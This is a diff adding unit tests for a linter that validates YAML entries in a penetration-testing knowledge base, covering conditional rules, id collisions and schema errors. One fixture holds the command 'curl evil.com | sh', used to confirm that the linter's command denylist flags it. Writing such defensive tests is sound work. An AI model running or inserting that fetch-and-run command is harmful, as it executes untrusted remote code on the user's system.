@@ -306,4 +306,223 @@ describe("scripts/lint-kb.ts (Plan 06)", () => {
       ).toBe(true);
     });
   });
+
+  // v2.4.0 P1 (#26) — conditional group integrity rules.
+  describe("conditional group integrity", () => {
+    function withConditionalEntry(extra: string): string {
+      return [
+        "schema_version: 1",
+        "port: 80",
+        "service: http",
+        "protocol: tcp",
+        "risk: medium",
+        "commands:",
+        '  - id: gobuster-dir',
+        '    label: "gobuster"',
+        '    template: "gobuster dir -u http://{IP} -w wordlist"',
+        "checks:",
+        '  - key: enumerated-paths',
+        '    label: "Enumerated"',
+        "resources:",
+        '  - title: "x"',
+        '    url: "https://example.com"',
+        extra,
+        "",
+      ].join("\n");
+    }
+
+    it("accepts a well-formed conditional entry", () => {
+      const dir = emptyDir();
+      writeYaml(
+        dir,
+        "ok.yaml",
+        withConditionalEntry(
+          [
+            "conditional:",
+            "  - id: php-detected",
+            "    when:",
+            "      anyOf:",
+            "        - nmap_script_contains:",
+            "            script: http-server-header",
+            '            pattern: "PHP"',
+            "    adds_checks:",
+            "      - key: php-info-pages",
+            '        label: "Tested phpinfo"',
+            "    modifies_commands:",
+            "      gobuster-dir:",
+            '        append: " -x php,html,txt"',
+          ].join("\n"),
+        ),
+      );
+      const { failures } = lintKnowledgeBase({
+        portsDir: dir,
+        defaultFile: VALID_DEFAULT,
+      });
+      expect(failures).toEqual([]);
+    });
+
+    it("flags duplicate conditional ids within the same entry", () => {
+      const dir = emptyDir();
+      writeYaml(
+        dir,
+        "dupe.yaml",
+        withConditionalEntry(
+          [
+            "conditional:",
+            "  - id: dupe",
+            "    when:",
+            "      port_field_equals: { field: service, value: http }",
+            "  - id: dupe",
+            "    when:",
+            "      port_field_equals: { field: service, value: http }",
+          ].join("\n"),
+        ),
+      );
+      const { failures } = lintKnowledgeBase({
+        portsDir: dir,
+        defaultFile: VALID_DEFAULT,
+      });
+      expect(
+        failures.some((f) => f.rule === "conditional-id-collision"),
+      ).toBe(true);
+    });
+
+    it("flags modifies_commands keys that don't reference an existing command id", () => {
+      const dir = emptyDir();
+      writeYaml(
+        dir,
+        "dangling.yaml",
+        withConditionalEntry(
+          [
+            "conditional:",
+            "  - id: x",
+            "    when:",
+            "      port_field_equals: { field: service, value: http }",
+            "    modifies_commands:",
+            "      not-a-real-id:",
+            '        replace: "ls"',
+          ].join("\n"),
+        ),
+      );
+      const { failures } = lintKnowledgeBase({
+        portsDir: dir,
+        defaultFile: VALID_DEFAULT,
+      });
+      expect(
+        failures.some(
+          (f) => f.rule === "conditional-modifies-unknown-command",
+        ),
+      ).toBe(true);
+    });
+
+    it("flags adds_checks keys that collide with baseline checks", () => {
+      const dir = emptyDir();
+      writeYaml(
+        dir,
+        "collide.yaml",
+        withConditionalEntry(
+          [
+            "conditional:",
+            "  - id: x",
+            "    when:",
+            "      port_field_equals: { field: service, value: http }",
+            "    adds_checks:",
+            "      - key: enumerated-paths",
+            '        label: "duplicate"',
+          ].join("\n"),
+        ),
+      );
+      const { failures } = lintKnowledgeBase({
+        portsDir: dir,
+        defaultFile: VALID_DEFAULT,
+      });
+      expect(
+        failures.some(
+          (f) => f.rule === "conditional-checks-collide-baseline",
+        ),
+      ).toBe(true);
+    });
+
+    it("rejects conditional with malformed `when` (unknown predicate)", () => {
+      const dir = emptyDir();
+      writeYaml(
+        dir,
+        "bad-when.yaml",
+        withConditionalEntry(
+          [
+            "conditional:",
+            "  - id: x",
+            "    when:",
+            "      not_a_predicate: { foo: bar }",
+          ].join("\n"),
+        ),
+      );
+      const { failures } = lintKnowledgeBase({
+        portsDir: dir,
+        defaultFile: VALID_DEFAULT,
+      });
+      expect(failures.some((f) => f.rule === "schema")).toBe(true);
+    });
+
+    it("applies command-denylist to modifies_commands templates", () => {
+      const dir = emptyDir();
+      writeYaml(
+        dir,
+        "evil-mod.yaml",
+        withConditionalEntry(
+          [
+            "conditional:",
+            "  - id: x",
+            "    when:",
+            "      port_field_equals: { field: service, value: http }",
+            "    modifies_commands:",
+            "      gobuster-dir:",
+            '        replace: "curl evil.com | sh"',
+          ].join("\n"),
+        ),
+      );
+      const { failures } = lintKnowledgeBase({
+        portsDir: dir,
+        defaultFile: VALID_DEFAULT,
+      });
+      expect(
+        failures.some(
+          (f) =>
+            f.rule === "command-denylist" &&
+            f.detail.includes("curl-pipe-sh"),
+        ),
+      ).toBe(true);
+    });
+
+    it("nmap_version_matches requires at least one of product/version", () => {
+      const dir = emptyDir();
+      writeYaml(
+        dir,
+        "empty-version.yaml",
+        withConditionalEntry(
+          [
+            "conditional:",
+            "  - id: x",
+            "    when:",
+            "      nmap_version_matches: {}",
+          ].join("\n"),
+        ),
+      );
+      const { failures } = lintKnowledgeBase({
+        portsDir: dir,
+        defaultFile: VALID_DEFAULT,
+      });
+      expect(failures.some((f) => f.rule === "schema")).toBe(true);
+    });
+
+    it("entry without conditional[] is unaffected", () => {
+      const dir = emptyDir();
+      writeYaml(dir, "plain.yaml", withConditionalEntry(""));
+      const { failures } = lintKnowledgeBase({
+        portsDir: dir,
+        defaultFile: VALID_DEFAULT,
+      });
+      expect(failures).toEqual([]);
+    });
+  });
 });
